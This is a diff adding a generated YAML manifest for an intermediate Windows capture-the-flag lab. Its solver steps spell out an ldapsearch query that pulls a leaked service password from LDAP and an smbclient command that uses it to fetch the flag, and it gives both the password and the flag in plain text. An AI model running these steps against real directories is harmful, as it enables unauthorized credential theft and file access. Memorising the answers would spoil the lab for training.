@@ -1,0 +1,30 @@
+# Generated from platform/labs/Windows/windows-2-10-ad-to-smb-scenario/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: windows-2-10-ad-to-smb-scenario
+track: Windows
+difficulty: intermediate
+source: platform/labs/Windows/windows-2-10-ad-to-smb-scenario/lab.yaml
+expected_services:
+- port: 389
+  protocol: tcp
+- port: 445
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/windows-2-10-ad-to-smb-scenario.sh
+  steps:
+  - name: Find the leaked service credential
+    command: ldapsearch -x -H ldap://{target.ldap} -D '{cred.analyst.user}' -w '{cred.analyst.pass}' -b 'dc=lab,dc=example,dc=org' '(uid=svc-backup)' description 2>&1
+    expect: S3rv1ce!Pass
+  - name: Retrieve the evidence token from the share
+    command: smbclient //{target.files}/evidence -U 'svc-backup%S3rv1ce!Pass' -c 'get flag.txt /tmp/flag.txt' >/dev/null 2>&1; cat /tmp/flag.txt
+    expect: OCR{ad_t0_smb_p4th}
+expected_flag_count: 1
+expected_flag: OCR{ad_t0_smb_p4th}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 512
+max_cpu: 0.5
